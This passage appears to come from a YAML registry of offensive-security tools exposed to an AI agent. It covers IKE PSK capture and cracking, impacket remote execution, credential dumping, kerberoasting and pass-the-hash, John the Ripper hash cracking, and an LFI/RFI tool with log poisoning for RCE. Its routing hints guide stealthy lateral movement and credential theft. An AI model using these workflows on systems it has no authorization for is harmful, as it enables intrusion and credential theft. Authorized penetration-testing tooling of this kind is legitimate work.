          detected:
            type: boolean
            description: Whether IKE service was detected
          hosts:
            type: array
            description: Responding hosts
          vendor_id:
            type: string
            description: Vendor ID if detected
      aggressive_mode:
        description: Test IKE aggressive mode with group name enumeration
        when_to_use: To test if VPN accepts a specific group name and capture PSK hash
        params:
          target:
            type: string
            required: true
            description: Target IP
          group_name:
            type: string
            required: true
            description: IKE group name (VPN ID) to test
          dport:
            type: integer
            default: 500
            description: Destination port
        returns:
          valid_group:
            type: boolean
            description: Whether group name is valid
          psk_vulnerable:
            type: boolean
            description: Whether PSK can be captured
          transforms:
            type: array
            description: Supported transforms
      enumerate_transforms:
        description: Enumerate supported IKE transforms/proposals
        when_to_use: To discover encryption and authentication methods supported
        params:
          target:
            type: string
            required: true
            description: Target IP
          dport:
            type: integer
            default: 500
            description: Destination port
        returns:
          transforms:
            type: array
            description: Supported transforms
          vendor_id:
            type: string
            description: Vendor identification
      brute_group_names:
        description: Brute force IKE group names with parallel scanning support
        when_to_use: To discover valid VPN group names for further exploitation
        params:
          target:
            type: string
            required: true
            description: Target IP
          wordlist:
            type: string
            default: common
            description: 'Wordlist: ''common'', ''company'', ''extensive'', or file path'
          names:
            type: array
            description: Inline list of group names to test (overrides wordlist)
          dport:
            type: integer
            default: 500
            description: Destination port
          concurrency:
            type: integer
            default: 5
            description: Number of parallel requests (max 10)
          delay:
            type: number
            default: 0.1
            description: Delay between requests in seconds
          stop_on_first:
            type: boolean
            default: false
            description: Stop when first valid group found
        returns:
          valid_groups:
            type: array
            description: Valid group names found
          found_count:
            type: integer
            description: Number of valid groups
          tested_count:
            type: integer
            description: Number of names tested
          concurrency_used:
            type: integer
            description: Concurrency level used
      get_psk_hash:
        description: Capture PSK hash for offline cracking
        when_to_use: After finding valid group name via brute_group_names or aggressive_mode
        next_step: Use ike-scan.crack_psk with the captured hash_data. Do NOT use john - it doesn't support IKE PSK format.
        params:
          target:
            type: string
            required: true
            description: Target IP
          group_name:
            type: string
            required: true
            description: Valid IKE group name
          dport:
            type: integer
            default: 500
            description: Destination port
        returns:
          psk_hash:
            type: string
            description: PSK hash for cracking - pass this to crack_psk method
          crackable:
            type: boolean
            description: Whether hash was captured
      crack_psk:
        description: Crack a captured PSK hash using psk-crack (dictionary or brute force)
        when_to_use: After capturing PSK hash with get_psk_hash. This is the ONLY way to crack IKE PSK hashes - john does
          not support this format.
        params:
          hash_data:
            type: string
            required: true
            description: PSK hash data from get_psk_hash
          wordlist:
            type: string
            default: common
            description: 'Built-in wordlist: ''common'', ''rockyou_sample'', or file path'
          passwords:
            type: array
            description: Inline list of passwords to try (overrides wordlist)
          bruteforce:
            type: boolean
            default: false
            description: Use brute force instead of dictionary
          charset:
            type: string
            default: alnum
            description: 'Charset for brute force: ''alnum'', ''alpha'', ''numeric'', ''special'''
          min_length:
            type: integer
            default: 1
            description: Min password length for brute force
          max_length:
            type: integer
            default: 6
            description: Max password length for brute force
        returns:
          cracked:
            type: boolean
            description: Whether password was cracked
          password:
            type: string
            description: Cracked password if successful
          method:
            type: string
            description: Method used (dictionary or bruteforce)
  impacket:
    name: impacket
    version: '0.12'
    description: 'Windows/Active Directory exploitation toolkit (Impacket 0.12). 13 methods in 4 categories: remote execution
      (psexec, wmiexec, smbexec, dcomexec, atexec — 5 execution methods with different stealth/reliability tradeoffs), credential
      dumping (secretsdump — SAM, LSA, NTDS.dit via DRSUAPI or VSS), Kerberos attacks (kerberoast, asreproast, get_tgt), SMB
      operations (smb_shares, smb_get, smb_put), AD enumeration (get_ad_users, lookupsid). All methods support password, NTLM
      hash (pass-the-hash), Kerberos, and AES key authentication.'
    image: ghcr.io/silicon-works/mcp-tools-impacket:latest
    image_size_mb: 900
    capabilities:
    - remote_execution
    - credential_dumping
    - pass_the_hash
    - kerberos_attacks
    - smb_operations
    - ad_enumeration
    phases:
    - enumeration
    - exploitation
    - post-exploitation
    requirements:
      network: true
      privileged: false
    resources:
      memory_mb: 512
      cpu: 0.5
    routing:
      use_for:
      - Windows remote command execution
      - pass-the-hash authentication
      - NTLM hash pass-the-hash
      - credential dumping from Windows
      - SAM database extraction
      - NTDS.dit dump
      - secretsdump
      - kerberoasting
      - AS-REP roasting
      - SMB share enumeration
      - SMB file transfer
      - Active Directory user enumeration
      - SID enumeration
      - Kerberos TGT request
      - Windows lateral movement
      - psexec wmiexec smbexec
      never_use_for:
      - Linux-only targets
      - port scanning
      - web application testing
      - SQL injection
      - password brute-forcing (use hydra instead)
      - vulnerability scanning
      triggers:
      - impacket
      - psexec
      - wmiexec
      - smbexec
      - dcomexec
      - atexec
      - secretsdump
      - kerberoast
      - asreproast
      - pass-the-hash
      - pass the hash
      - pth
      - ntlm hash
      - GetUserSPNs
      - GetNPUsers
      - GetADUsers
      - lookupsid
      - getTGT
      prefer_over: []
    methods:
      psexec:
        description: Execute commands on a remote Windows host via PsExec (creates a service, most reliable but noisy)
        when_to_use: When reliable remote execution is needed and stealth is not critical. Uses SMB service creation.
        params:
          target:
            type: string
            required: true
            description: Target IP address or hostname
          username:
            type: string
            description: Username for authentication
          password:
            type: string
            description: Password for authentication
          domain:
            type: string
            description: Active Directory domain name
          hashes:
            type: string
            description: NTLM hash in LM:NT format for pass-the-hash
          kerberos:
            type: boolean
            default: false
            description: Use Kerberos authentication
          dc_ip:
            type: string
            description: Domain Controller IP
          aes_key:
            type: string
            description: AES key for Kerberos authentication
          port:
            type: integer
            description: 'Target SMB port (default: 445)'
          command:
            type: string
            description: Command to execute (omit for interactive shell)
          service_name:
            type: string
            description: Custom service name for stealth
          codec:
            type: string
            default: utf-8
            description: Output codec
          timeout:
            type: integer
            default: 120
            description: Timeout in seconds
        returns:
          method:
            type: string
            description: Execution method used (psexec)
          output:
            type: string
            description: Command output
          info:
            type: array
            description: Informational messages
          warnings:
            type: array
            description: Warning messages
      wmiexec:
        description: Execute commands on a remote Windows host via WMI (stealthier than psexec, no service creation)
        when_to_use: When stealth matters - no service creation, uses WMI for execution. Preferred for lateral movement.
        params:
          target:
            type: string
            required: true
            description: Target IP address or hostname
          username:
            type: string
            description: Username for authentication
          password:
            type: string
            description: Password for authentication
          domain:
            type: string
            description: Active Directory domain name
          hashes:
            type: string
            description: NTLM hash in LM:NT format for pass-the-hash
          kerberos:
            type: boolean
            default: false
            description: Use Kerberos authentication
          dc_ip:
            type: string
            description: Domain Controller IP
          aes_key:
            type: string
            description: AES key for Kerberos authentication
          port:
            type: integer
            description: 'Target port (default: 135 for WMI)'
          command:
            type: string
            description: Command to execute
          nooutput:
            type: boolean
            default: false
            description: Do not retrieve command output (blind execution)
          codec:
            type: string
            default: utf-8
            description: Output codec
          timeout:
            type: integer
            default: 120
            description: Timeout in seconds
        returns:
          method:
            type: string
            description: Execution method used (wmiexec)
          output:
            type: string
            description: Command output
      smbexec:
        description: Execute commands on a remote Windows host via SMB (native commands, no binary upload needed)
        when_to_use: When other methods fail or when you want native command execution without uploading binaries
        params:
          target:
            type: string
            required: true
            description: Target IP address or hostname
          username:
            type: string
            description: Username for authentication
          password:
            type: string
            description: Password for authentication
          domain:
            type: string
            description: Active Directory domain name
          hashes:
            type: string
            description: NTLM hash in LM:NT format for pass-the-hash
          kerberos:
            type: boolean
            default: false
            description: Use Kerberos authentication
          dc_ip:
            type: string
            description: Domain Controller IP
          aes_key:
            type: string
            description: AES key for Kerberos authentication
          port:
            type: integer
            description: 'Target SMB port (default: 445)'
          command:
            type: string
            description: Command to execute
          share:
            type: string
            default: C$
            description: Writable share for output
          mode:
            type: enum
            values:
            - SHARE
            - SERVER
            default: SHARE
            description: Execution mode
          codec:
            type: string
            default: utf-8
            description: Output codec
          timeout:
            type: integer
            default: 120
            description: Timeout in seconds
        returns:
          method:
            type: string
            description: Execution method used (smbexec)
          output:
            type: string
            description: Command output
      dcomexec:
        description: Execute commands on a remote Windows host via DCOM objects (MMC20, ShellWindows, ShellBrowserWindow)
        when_to_use: Alternative lateral movement using DCOM. Useful when SMB-based methods are blocked.
        params:
          target:
            type: string
            required: true
            description: Target IP address or hostname
          username:
            type: string
            description: Username for authentication
          password:
            type: string
            description: Password for authentication
          domain:
            type: string
            description: Active Directory domain name
          hashes:
            type: string
            description: NTLM hash in LM:NT format for pass-the-hash
          kerberos:
            type: boolean
            default: false
            description: Use Kerberos authentication
          dc_ip:
            type: string
            description: Domain Controller IP
          aes_key:
            type: string
            description: AES key for Kerberos authentication
          port:
            type: integer
            description: 'Target port (default: 135 for DCOM)'
          command:
            type: string
            description: Command to execute
          dcom_object:
            type: enum
            values:
            - MMC20
            - ShellWindows
            - ShellBrowserWindow
            default: MMC20
            description: DCOM object to use for execution
          nooutput:
            type: boolean
            default: false
            description: Do not retrieve command output
          codec:
            type: string
            default: utf-8
            description: Output codec
          timeout:
            type: integer
            default: 120
            description: Timeout in seconds
        returns:
          method:
            type: string
            description: Execution method used (dcomexec)
          object:
            type: string
            description: DCOM object used
          output:
            type: string
            description: Command output
      atexec:
        description: Execute commands on a remote Windows host via Task Scheduler (scheduled task based execution)
        when_to_use: When other execution methods are blocked. Uses Windows Task Scheduler for command execution.
        params:
          target:
            type: string
            required: true
            description: Target IP address or hostname
          command:
            type: string
            required: true
            description: Command to execute via scheduled task
          username:
            type: string
            description: Username for authentication
          password:
            type: string
            description: Password for authentication
          domain:
            type: string
            description: Active Directory domain name
          hashes:
            type: string
            description: NTLM hash in LM:NT format for pass-the-hash
          kerberos:
            type: boolean
            default: false
            description: Use Kerberos authentication
          dc_ip:
            type: string
            description: Domain Controller IP
          aes_key:
            type: string
            description: AES key for Kerberos authentication
          port:
            type: integer
            description: 'Target SMB port (default: 445)'
          codec:
            type: string
            default: utf-8
            description: Output codec
          timeout:
            type: integer
            default: 120
            description: Timeout in seconds
        returns:
          method:
            type: string
            description: Execution method used (atexec)
          output:
            type: string
            description: Command output
      secretsdump:
        description: Dump credentials from a Windows host (SAM, LSA secrets, cached creds, NTDS.dit via DRSUAPI/VSS)
        when_to_use: After gaining admin access to dump password hashes. Use -just-dc on domain controllers for NTDS.dit.
        params:
          target:
            type: string
            required: true
            description: Target IP address or hostname
          username:
            type: string
            description: Username for authentication (needs admin privileges)
          password:
            type: string
            description: Password for authentication
          domain:
            type: string
            description: Active Directory domain name
          hashes:
            type: string
            description: NTLM hash in LM:NT format for pass-the-hash
          kerberos:
            type: boolean
            default: false
            description: Use Kerberos authentication
          dc_ip:
            type: string
            description: Domain Controller IP
          aes_key:
            type: string
            description: AES key for Kerberos authentication
          port:
            type: integer
            description: 'Target SMB port (default: 445)'
          just_dc:
            type: boolean
            default: false
            description: Only extract NTDS.dit data via DRSUAPI (DC only, much faster)
          just_dc_ntlm:
            type: boolean
            default: false
            description: Only extract NTLM hashes from NTDS.dit
          just_dc_user:
            type: string
            description: Extract only this user's hash from NTDS.dit
          use_vss:
            type: boolean
            default: false
            description: Use Volume Shadow Copy instead of DRSUAPI
          exec_method:
            type: enum
            values:
            - smbexec
            - wmiexec
            - mmcexec
            description: Remote execution method for VSS
          timeout:
            type: integer
            default: 600
            description: Timeout in seconds (credential dumping can be slow)
        returns:
          sam_hashes:
            type: array
            description: Local SAM hashes (user:rid:lm:nt:::)
          lsa_secrets:
            type: array
            description: LSA secrets
          cached_creds:
            type: array
            description: Domain cached credentials
          ntds_hashes:
            type: array
            description: NTDS.dit hashes (domain controller)
          kerberos_keys:
            type: array
            description: Kerberos encryption keys
          total_hashes:
            type: integer
            description: Total number of hashes extracted
      kerberoast:
        description: Kerberoasting attack - extract TGS service ticket hashes for offline cracking (targets accounts with
          SPNs)
        when_to_use: With any valid domain credentials to extract service account hashes for offline cracking
        params:
          target:
            type: string
            required: true
            description: 'Target domain or DC IP (format: domain/user:pass@dc_ip or just dc_ip)'
          username:
            type: string
            description: Domain username
          password:
            type: string
            description: Domain password
          domain:
            type: string
            description: Active Directory domain name
          hashes:
            type: string
            description: NTLM hash in LM:NT format
          kerberos:
            type: boolean
            default: false
            description: Use Kerberos authentication
          dc_ip:
            type: string
            description: Domain Controller IP
          aes_key:
            type: string
            description: AES key for Kerberos authentication
          port:
            type: integer
            description: Target port
          request_user:
            type: string
            description: Target a specific user's SPN
          output_format:
            type: enum
            values:
            - hashcat
            - john
            default: hashcat
            description: Hash output format for cracking
          timeout:
            type: integer
            default: 120
            description: Timeout in seconds
        returns:
          hashes:
            type: array
            description: TGS hashes in requested format (hashcat/john)
          hash_count:
            type: integer
            description: Number of hashes extracted
          users_with_spns:
            type: array
            description: Users with SPNs (spn, username, member_of, pwd_last_set)
          user_count:
            type: integer
            description: Number of users with SPNs found
      asreproast:
        description: AS-REP Roasting - extract hashes for accounts with Kerberos pre-authentication disabled
        when_to_use: To find accounts without Kerberos pre-authentication and extract their hashes for cracking
        params:
          target:
            type: string
            required: true
            description: Target domain or DC IP
          username:
            type: string
            description: Domain username (or blank for unauthenticated with usersfile)
          password:
            type: string
            description: Domain password
          domain:
            type: string
            description: Active Directory domain name
          hashes:
            type: string
            description: NTLM hash in LM:NT format
          kerberos:
            type: boolean
            default: false
            description: Use Kerberos authentication
          dc_ip:
            type: string
            description: Domain Controller IP
          aes_key:
            type: string
            description: AES key for Kerberos authentication
          port:
            type: integer
            description: Target port
          usersfile:
            type: string
            description: File with list of usernames to test (one per line)
          output_format:
            type: enum
            values:
            - hashcat
            - john
            default: hashcat
            description: Hash output format for cracking
          timeout:
            type: integer
            default: 120
            description: Timeout in seconds
        returns:
          hashes:
            type: array
            description: AS-REP hashes in requested format
          hash_count:
            type: integer
            description: Number of hashes extracted
          vulnerable_users:
            type: array
            description: Users without pre-authentication
      smb_shares:
        description: List SMB shares on a remote Windows host with access permissions
        when_to_use: To enumerate available SMB shares before accessing files
        params:
          target:
            type: string
            required: true
            description: Target IP address or hostname
          username:
            type: string
            description: Username for authentication
          password:
            type: string
            description: Password for authentication
          domain:
            type: string
            description: Active Directory domain name
          hashes:
            type: string
            description: NTLM hash in LM:NT format
          kerberos:
            type: boolean
            default: false
            description: Use Kerberos authentication
          dc_ip:
            type: string
            description: Domain Controller IP
          aes_key:
            type: string
            description: AES key for Kerberos authentication
          port:
            type: integer
            description: 'Target SMB port (default: 445)'
          timeout:
            type: integer
            default: 60
            description: Timeout in seconds
        returns:
          shares:
            type: array
            description: Available shares with name, type, and comment
          share_count:
            type: integer
            description: Number of shares found
      smb_get:
        description: Download a file from an SMB share
        when_to_use: To retrieve files from Windows shares (config files, scripts, sensitive data)
        params:
          target:
            type: string
            required: true
            description: Target IP address or hostname
          share:
            type: string
            required: true
            description: Share name (e.g., 'C$', 'Users', 'SYSVOL')
          remote_path:
            type: string
            required: true
            description: Path within the share
          username:
            type: string
            description: Username for authentication
          password:
            type: string
            description: Password for authentication
          domain:
            type: string
            description: Active Directory domain name
          hashes:
            type: string
            description: NTLM hash in LM:NT format
          kerberos:
            type: boolean
            default: false
            description: Use Kerberos authentication
          dc_ip:
            type: string
            description: Domain Controller IP
          aes_key:
            type: string
            description: AES key for Kerberos authentication
          port:
            type: integer
            description: 'Target SMB port (default: 445)'
          timeout:
            type: integer
            default: 120
            description: Timeout in seconds
        returns:
          content:
            type: string
            description: File content
          size:
            type: integer
            description: File size in bytes
      smb_put:
        description: Upload content to an SMB share
        when_to_use: To upload files to Windows shares (payloads, scripts, tools)
        params:
          target:
            type: string
            required: true
            description: Target IP address or hostname
          share:
            type: string
            required: true
            description: Share name (e.g., 'C$', 'Users')
          remote_path:
            type: string
            required: true
            description: Destination path within the share
          content:
            type: string
            required: true
            description: Content to upload
          username:
            type: string
            description: Username for authentication
          password:
            type: string
            description: Password for authentication
          domain:
            type: string
            description: Active Directory domain name
          hashes:
            type: string
            description: NTLM hash in LM:NT format
          kerberos:
            type: boolean
            default: false
            description: Use Kerberos authentication
          dc_ip:
            type: string
            description: Domain Controller IP
          aes_key:
            type: string
            description: AES key for Kerberos authentication
          port:
            type: integer
            description: 'Target SMB port (default: 445)'
          timeout:
            type: integer
            default: 120
            description: Timeout in seconds
        returns:
          size:
            type: integer
            description: Uploaded content size in bytes
      get_ad_users:
        description: Enumerate Active Directory users via LDAP (requires domain credentials)
        when_to_use: During enumeration phase to discover domain users for targeting
        params:
          target:
            type: string
            required: true
            description: Target domain or DC IP
          username:
            type: string
            description: Domain username
          password:
            type: string
            description: Domain password
          domain:
            type: string
            description: Active Directory domain name
          hashes:
            type: string
            description: NTLM hash in LM:NT format
          kerberos:
            type: boolean
            default: false
            description: Use Kerberos authentication
          dc_ip:
            type: string
            description: Domain Controller IP
          aes_key:
            type: string
            description: AES key for Kerberos authentication
          port:
            type: integer
            description: Target LDAP port
          all:
            type: boolean
            default: false
            description: Return all user attributes (verbose)
          timeout:
            type: integer
            default: 120
            description: Timeout in seconds
        returns:
          users:
            type: array
            description: AD users with name, email, and creation date
          user_count:
            type: integer
            description: Number of users found
      lookupsid:
        description: Brute-force SID enumeration to discover domain users, groups, and aliases
        when_to_use: To enumerate domain objects when LDAP is restricted or for initial domain recon
        params:
          target:
            type: string
            required: true
            description: Target IP address or hostname
          username:
            type: string
            description: Username for authentication
          password:
            type: string
            description: Password for authentication
          domain:
            type: string
            description: Active Directory domain name
          hashes:
            type: string
            description: NTLM hash in LM:NT format
          kerberos:
            type: boolean
            default: false
            description: Use Kerberos authentication
          dc_ip:
            type: string
            description: Domain Controller IP
          aes_key:
            type: string
            description: AES key for Kerberos authentication
          port:
            type: integer
            description: 'Target SMB port (default: 445)'
          max_rid:
            type: integer
            default: 4000
            description: Maximum RID to enumerate
          timeout:
            type: integer
            default: 120
            description: Timeout in seconds
        returns:
          domain_sid:
            type: string
            description: Domain SID
          users:
            type: array
            description: Discovered users with RID, name, and type
          groups:
            type: array
            description: Discovered groups
          aliases:
            type: array
            description: Discovered aliases
          total:
            type: integer
            description: Total objects discovered
      get_tgt:
        description: Request a Kerberos TGT and save the ccache file for pass-the-ticket attacks
        when_to_use: To obtain a TGT for Kerberos-based attacks or when needing to authenticate via tickets
        params:
          target:
            type: string
            required: true
            description: Target domain or DC IP
          username:
            type: string
            description: Domain username
          password:
            type: string
            description: Domain password
          domain:
            type: string
            description: Active Directory domain name
          hashes:
            type: string
            description: NTLM hash in LM:NT format
          kerberos:
            type: boolean
            default: false
            description: Use Kerberos authentication
          dc_ip:
            type: string
            description: Domain Controller IP
          aes_key:
            type: string
            description: AES key for Kerberos authentication
          port:
            type: integer
            description: Target port
          timeout:
            type: integer
            default: 60
            description: Timeout in seconds
        returns:
          ccache_file:
            type: string
            description: Path to saved ccache file
          ccache_exists:
            type: boolean
            description: Whether ccache file was saved successfully
          hint:
            type: string
            description: Usage hint for the ccache file
  john:
    name: john
    version: 1.9.0-jumbo-1
    description: 'Password hash cracking tool — John the Ripper 1.9.0-jumbo-1 (community-enhanced version) with AVX2 acceleration.
      Supports 300+ hash formats including md5crypt, sha512crypt, bcrypt, NTLM, LM, MySQL, MSSQL, Oracle, PostgreSQL, Kerberos,
      WPA, SSH keys, ZIP/RAR/PDF/Office. Includes ~300 *2john converter scripts (ssh2john, zip2john, pdf2john, office2john,
      etc.) for extracting crackable hashes from encrypted files. Cracking modes: wordlist (with mangling rules), incremental
      (brute-force), mask (pattern-based), single (username-derived), PRINCE (combination). Ships with rockyou.txt (14M passwords)
      and john''s built-in password.lst wordlist.'
    image: ghcr.io/silicon-works/mcp-tools-john:latest
    image_size_mb: 200
    capabilities:
    - password_cracking
    - hash_identification
    routing:
      use_for:
      - crack password hashes from /etc/shadow or database dumps
      - crack Windows NTLM LM hashes from SAM or secretsdump
      - crack MD5 SHA1 SHA256 SHA512 bcrypt hashes
      - crack Kerberos TGS tickets (kerberoasting)
      - crack SSH private key passphrases
      - crack ZIP RAR PDF Office encrypted file passwords
      - identify unknown hash format type
      - offline password cracking with wordlists
      - recover plaintext from password hashes
      - crack MySQL PostgreSQL Oracle database password hashes
      never_use_for:
      - task: IKE/IPsec PSK hash cracking
        use_instead: ike-scan.crack_psk
        reason: John does not support psk-ike format. Use ike-scan's built-in crack_psk method which uses psk-crack.
      - task: VPN PSK cracking
        use_instead: ike-scan.crack_psk
        reason: IKE PSK hashes require psk-crack, not John the Ripper
      - online brute-forcing (use hydra)
      - network authentication testing (use hydra)
      triggers:
      - crack password
      - hash crack
      - shadow file
      - ntlm
      - john
      - john the ripper
      - rockyou
      - kerberoast
      - hashcat
      prefer_over: []
    phases:
    - post-exploitation
    requirements:
      network: false
      privileged: false
    resources:
      memory_mb: 1024
      cpu: 2.0
    methods:
      crack:
        description: Crack password hashes using john's wordlist mode with optional mangling rules. Writes hashes to a temp
          file, runs john with the specified wordlist and format, then runs john --show to collect cracked results. Uses AVX2
          acceleration when available. The 'rockyou' wordlist (14M passwords) is the default and cracks most weak passwords.
          With rules enabled (default), john applies word mangling transformations (capitalization, number appending, leet
          speak, etc.) which dramatically increases coverage. John stores cracked passwords in ~/.john/john.pot — subsequent
          calls for the same hash return instantly from the pot file.
        when_to_use: 'After extracting password hashes from any source: /etc/shadow (Linux), SAM/NTDS.dit/secretsdump (Windows),
          database dumps (MySQL, PostgreSQL, MSSQL), web application databases, Kerberos tickets (kerberoasting). Always specify
          the format if you know it — auto-detection works but can be slow or wrong with ambiguous hashes. Common workflow:
          (1) Extract hashes (e.g., from /etc/shadow, sqlmap dump, impacket secretsdump), (2) Identify format if unsure, (3)
          Crack with rockyou, (4) If no results, try ''common'' wordlist (john''s password.lst) with rules for faster iteration.
          For bcrypt/scrypt hashes, expect very slow cracking (minutes per password) — reduce timeout expectations. For simple
          MD5/SHA hashes, rockyou with rules cracks most weak passwords in under a minute.'
        params:
          hashes:
            type: string
            required: true
            description: 'Hash(es) to crack, one per line. Supports multiple formats: bare hash (''5f4dcc3b5aa765d61d8327deb882cf99''),
              user:hash (''admin:$6$rounds=5000$...''), /etc/shadow format (''root:$6$salt$hash:...''). For multiple hashes,
              separate with newlines. John auto-detects the format from the hash structure.'
          format:
            type: string
            default: auto
            description: 'Hash format name. ''auto'' attempts detection (may fail for raw/ambiguous hashes). Common formats:
              ''raw-md5'' (unsalted MD5), ''raw-sha1'', ''raw-sha256'', ''raw-sha512'', ''md5crypt'' ($1$), ''sha256crypt''
              ($5$), ''sha512crypt'' ($6$, Linux /etc/shadow), ''bcrypt'' ($2a$/$2b$), ''ntlm'' (Windows), ''lm'' (legacy
              Windows), ''mysql'' (MySQL 4.1+), ''mssql'' (SQL Server), ''descrypt'' (DES crypt), ''ssh'' (SSH key passphrase
              via ssh2john), ''zip''/''rar''/''pdf'' (encrypted files via *2john). John supports 300+ formats total — use
              identify method to determine the correct format.'
          wordlist:
            type: string
            default: rockyou
            description: 'Wordlist name or path. Built-in: ''rockyou'' (/usr/share/wordlists/rockyou.txt, ~14M passwords —
              comprehensive, default), ''common'' (/usr/share/john/password.lst, ~3K passwords — fast). Or provide an absolute
              path to a custom wordlist.'
          rules:
            type: boolean
            default: true
            description: 'Apply john''s word mangling rules (--rules). Transforms each wordlist entry through ~100 rules:
              capitalize, append numbers (password1, password123), leet speak (p@ssw0rd), reverse, etc. Increases effective
              wordlist size by ~100x. Enabled by default. Disable for raw wordlist-only testing (faster but less coverage).'
          timeout:
            type: integer
            default: 300
            description: 'Maximum cracking time in seconds. Default 300s (5 min). For MD5/SHA with rockyou: 1-2 minutes is
              usually enough. For bcrypt ($2a$, cost 10+): each hash takes ~0.01s to test, so 14M wordlist takes ~40 hours
              — use ''common'' wordlist instead. For NTLM: very fast, 300s is more than enough for rockyou.'
          mask:
            type: string
            description: 'Mask pattern for targeted cracking (alternative to wordlist). Placeholders: ?l=lowercase, ?u=uppercase,
              ?d=digit, ?s=special, ?a=all printable. Examples: ''?u?l?l?l?d?d?d?d'' (Name1234), ''Company?d?d?d?d'' (Company
              + 4 digits), ''?d?d?d?d'' (4-digit PIN). Overrides wordlist if provided. Much faster than wordlist for known
              password patterns.'
          incremental:
            type: boolean
            default: false
            description: Use incremental (brute-force) mode — tries all character combinations. Very slow but guaranteed to
              find the password eventually. Only practical for short passwords (8 chars or less). Overrides both wordlist
              and mask.
          fork:
            type: integer
            description: Number of processes to fork for parallel cracking (--fork=N). Set to number of CPU cores for maximum
              speed. Most useful for slow hash types like bcrypt and scrypt where each attempt is expensive.
        returns:
          cracked:
            type: array
            description: 'Cracked results. Each entry: {user: ''username'', password: ''plaintext''}. Empty array if nothing
              cracked.'
          count:
            type: integer
            description: Number of passwords cracked
          format:
            type: string
            description: Hash format used
          mode:
            type: string
            description: 'Cracking mode used: ''wordlist'', ''mask'', or ''incremental'''
          wordlist:
            type: string
            description: Full path to wordlist used (only present in wordlist mode)
          mask:
            type: string
            description: Mask pattern used (only present in mask mode)
      show:
        description: 'Show previously cracked passwords from john''s pot file (~/.john/john.pot). John caches all cracked
          passwords persistently — this retrieves results without re-cracking. Writes the hashes to a temp file, runs john
          --show, and parses the output. Useful for: (1) checking if hashes were already cracked in a previous crack call,
          (2) retrieving results after a timeout, (3) checking the pot file after manual cracking.'
        when_to_use: After a crack attempt (especially one that timed out) to check what was cracked. Also use when you have
          the same hashes and want to see if they were cracked in a previous session. John's pot file persists across calls
          within the same container session, so all previously cracked passwords are retrievable. If crack returns 0 results
          but you suspect it worked (e.g., you saw progress in raw_output), call show to check the pot file.
        params:
          hashes:
            type: string
            required: true
            description: Hash(es) to check, same format as the crack method. Must match what was originally passed to crack
              (john matches by hash value in the pot file).
          format:
            type: string
            default: auto
            description: Hash format. Should match the format used in the crack call. If 'auto' was used for cracking, use
              'auto' here too.
        returns:
          cracked:
            type: array
            description: 'Previously cracked results from the pot file. Each entry: {user: ''username'', password: ''plaintext''}'
          count:
            type: integer
            description: Number of cracked passwords found in pot file
      identify:
        description: Identify the format of an unknown hash using pattern matching and john format probing. First checks against
          16 common hash patterns (md5crypt, sha256crypt, sha512crypt, bcrypt, phpass, argon2, SSHA, raw-MD5/NTLM, raw-SHA1,
          raw-SHA256, raw-SHA512, MySQL, etc.). If no pattern matches, falls back to probing 8 john formats. Returns a list
          of possible format names.
        when_to_use: When you have a hash but don't know its format — e.g., found a hash in a config file, database, or web
          application and need to determine the correct john format name before cracking. Pattern matching handles most common
          formats instantly. If this method returns 'unknown', try the hash-lookup tool or check hash format references online.
          For hashes from specific sources (MySQL, PostgreSQL, etc.), the format is usually known from context.
        params:
          hash:
            type: string
            required: true
            description: Single hash to identify. Can be a bare hash ('5f4dcc3b5aa765d61d8327deb882cf99') or in user:hash
              format ('admin:$6$salt$hash'). Only provide ONE hash — multiple hashes may confuse the detection.
        returns:
          possible_formats:
            type: array
            description: List of john format names that accepted the hash (e.g., ['raw-md5', 'ntlm']). 'unknown' if no format
              matched. Multiple matches are common for ambiguous hashes (e.g., 32 hex chars matches both raw-md5 and ntlm).
      convert:
        description: Extract a crackable hash from an encrypted file using john's *2john converter scripts. Supports 24 file
          types including SSH keys, ZIP/RAR/7z archives, PDF/Office documents, password managers (KeePass, Bitwarden, LastPass,
          1Password), crypto wallets (Bitcoin, Ethereum), disk encryption (TrueCrypt, LUKS, BitLocker, DMG), and more. The
          output hash can be passed directly to the crack method.
        when_to_use: 'When you have an encrypted file and need to crack its password. Common scenarios: (1) Found an encrypted
          SSH private key — use file_type=''ssh'' to extract the hash, then crack it. (2) Found a password-protected ZIP file
          — use file_type=''zip''. (3) Found a KeePass database — use file_type=''keepass''. (4) Found an Ansible vault —
          use file_type=''ansible''. The workflow is always: convert → crack. The file must be accessible inside the container
          (mount via session directory).'
        params:
          file_path:
            type: string
            required: true
            description: 'Path to the encrypted file inside the container. Files from the session working directory are mounted
              at /session/. Examples: ''/session/id_rsa'', ''/session/backup.zip'', ''/session/vault.kdbx''.'
          file_type:
            type: enum
            required: true
            values:
            - ssh
            - zip
            - rar
            - pdf
            - office
            - 7z
            - keepass
            - gpg
            - bitcoin
            - ethereum
            - truecrypt
            - luks
            - ansible
            - bitwarden
            - lastpass
            - 1password
            - keychain
            - pfx
            - mozilla
            - telegram
            - signal
            - dmg
            - bitlocker
            description: Type of encrypted file — determines which *2john converter to use. ssh=SSH private key, zip=ZIP archive,
              rar=RAR archive, pdf=PDF document, office=MS Office (Word/Excel/PowerPoint), 7z=7-Zip archive, keepass=KeePass
              database (.kdbx), gpg=GPG encrypted file, bitcoin/ethereum=crypto wallets, truecrypt/luks/bitlocker/dmg=disk
              encryption, ansible=Ansible vault, bitwarden/lastpass/1password=password manager exports, keychain=macOS keychain,
              pfx=PKCS#12 certificate, mozilla=Firefox/Thunderbird profiles, telegram/signal=messaging app data.
        returns:
          hash:
            type: string
            description: Extracted hash in john-compatible format. Pass this directly to crack method's 'hashes' parameter.
          file:
            type: string
            description: Original file path
          converter:
            type: string
            description: Name of the *2john converter script used (e.g., 'ssh2john.py', 'zip2john')
          file_type:
            type: string
            description: File type that was converted
  lfi-rfi:
    name: lfi-rfi
    version: '1.0'
    description: 'Local File Inclusion (LFI) and Remote File Inclusion (RFI) testing and exploitation tool. 5 methods: test_lfi
      (automated directory traversal with multiple encodings and depths), test_rfi (remote URL inclusion with PHP wrappers),
      read_file (extract specific files via confirmed LFI), php_filter (read PHP source code via php://filter/convert.base64-encode),
      log_poison (inject PHP code into log files via User-Agent/Referer/X-Forwarded-For headers for RCE). Supports Linux and
      Windows path traversal patterns. Uses {PAYLOAD} placeholder in URLs. Authenticated testing via cookies.'
    image: ghcr.io/silicon-works/mcp-tools-lfi-rfi:latest
    image_size_mb: 100
    capabilities:
    - lfi_testing
    - rfi_testing
    - path_traversal
    - php_filters
    - log_poisoning
    phases:
    - enumeration
    - exploitation
    requirements:
      network: true
      privileged: false
    resources:
      memory_mb: 128
      cpu: 0.5
    routing:
      use_for:
      - test URL parameter for Local File Inclusion with path traversal
      - read arbitrary files on web server via LFI vulnerability
      - read PHP source code via php://filter wrapper
